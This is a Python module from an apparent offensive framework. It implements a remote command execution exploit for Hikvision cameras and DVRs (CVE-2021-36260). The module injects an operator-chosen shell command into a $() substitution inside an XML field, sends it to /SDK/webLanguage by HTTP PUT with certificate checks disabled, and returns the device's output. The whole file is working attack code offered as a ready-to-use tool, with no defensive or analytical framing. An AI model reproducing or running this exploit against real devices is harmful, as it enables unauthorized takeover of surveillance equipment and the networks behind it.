import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "hikvision/cve_2021_36260_attack"
        self.description = "Remote Code Execution (RCE) exploit for Hikvision devices (CVE-2021-36260)."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"},
            "CMD": {"required": True, "value": "id"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        cmd = self.options["CMD"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/SDK/webLanguage"
        else:
            url = f"{target.rstrip('/')}/SDK/webLanguage"
            
        headers = {
            "Content-Type": "application/xml",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) dvr-framework/1.0"
        }
        
        # Injection directe de votre commande personnalisée dans le bloc CDATA du XML
        payload = (
            "<?xml version='1.0' encoding='UTF-8'?>"
            "<Language>"
            f"<id><![CDATA[$({cmd})]]></id>"
            "</Language>"
        )
        
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print(f"\033[1;33m[*] Envoi de la commande payload: {cmd}\033[0m")
                response = await client.put(url, headers=headers, content=payload)
                
                # Si la caméra renvoie du texte ou un statut d'erreur contenant la sortie
                if response.status_code in [200, 500] and response.text:
                    return {
                        "success": True,
                        "details": f"Command executed. Server response raw output:\n{response.text.strip()}"
                    }
                else:
                    return {
                        "success": True,
                        "details": f"Payload sent, but device returned empty output (Status: {response.status_code})."
                    }
                    
        except httpx.RequestError as e:
            return {"success": False, "error": f"Exploit failed: {type(e).__name__}"}
        except Exception as e:
            return {"success": False, "error": str(e)}
